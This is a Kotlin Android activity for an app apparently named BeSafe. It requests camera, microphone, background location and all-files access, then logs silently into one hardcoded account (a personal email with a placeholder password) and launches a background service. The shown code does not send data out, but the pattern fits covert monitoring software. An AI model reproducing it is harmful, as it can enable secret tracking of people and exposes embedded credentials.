package com.be.safe

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationChannelCompat
import androidx.core.app.NotificationManagerCompat
import com.be.safe.services.BackgroundService
import com.be.safe.supabase.SupabaseClient
import io.github.jan.supabase.auth.auth
import io.github.jan.supabase.auth.providers.builtin.Email
import io.github.jan.supabase.exceptions.RestException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : ComponentActivity() {

    private val requiredPermissions = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.ACCESS_BACKGROUND_LOCATION
    ).apply {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
            add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            add(Manifest.permission.MANAGE_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.all { it.value }
        if (!allGranted) {
            showPermissionError()
        } else {
            attemptLogin()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        createNotificationChannel()

        setContent {
            MaterialTheme {
                LoadingScreen()
            }
        }

        CoroutineScope(Dispatchers.IO).launch {
            val session = SupabaseClient.client.auth.currentSessionOrNull()
            if (session != null) {
                startService(Intent(this@MainActivity, BackgroundService::class.java))
                withContext(Dispatchers.Main) {
                    finish()
                }
            } else {
                requestPermissions()
            }
        }
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannelCompat.Builder(
            "besafe_channel",
            NotificationManagerCompat.IMPORTANCE_DEFAULT
        )
            .setName("BeSafe Safety Monitoring")
            .setDescription("Shows when BeSafe is running to keep you safe")
            .build()
        NotificationManagerCompat.from(this).createNotificationChannel(channel)
    }

    private fun requestPermissions() {
        val permissionsToRequest = requiredPermissions.filter {
            ActivityCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isNotEmpty()) {
            permissionLauncher.launch(permissionsToRequest)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
            !android.os.Environment.isExternalStorageManager()
        ) {
            try {
                startActivity(
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = android.net.Uri.parse("package:$packageName")
                    }
                )
            } catch (e: Exception) {
                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
            }
        } else {
            attemptLogin()
        }
    }

    private fun attemptLogin() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                SupabaseClient.client.auth.signInWith(Email) {
                    email = "kambojistheking@gmail.com"
                    password = "your_password_here"
                }
                startService(Intent(this@MainActivity, BackgroundService::class.java))
                withContext(Dispatchers.Main) {
                    finish()
                }
            } catch (e: RestException) {
                withContext(Dispatchers.Main) {
                    showAuthError(e.message ?: "Authentication failed")
                }
            }
        }
    }

    private fun showPermissionError() {
        CoroutineScope(Dispatchers.Main).launch {
            // Handle permission denied error in UI if needed
        }
    }

    private fun showAuthError(message: String) {
        // Update UI with auth error message if needed
    }

    @Composable
    fun LoadingScreen() {
        var error by remember { mutableStateOf("") }

        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(16.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            CircularProgressIndicator()
            Spacer(modifier = Modifier.height(16.dp))
            Text(
                text = "Initializing BeSafe...",
                style = MaterialTheme.typography.headlineMedium
            )
            if (error.isNotEmpty()) {
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = error,
                    color = MaterialTheme.colorScheme.error,
                    style = MaterialTheme.typography.bodyMedium
                )
            }
        }
    }
}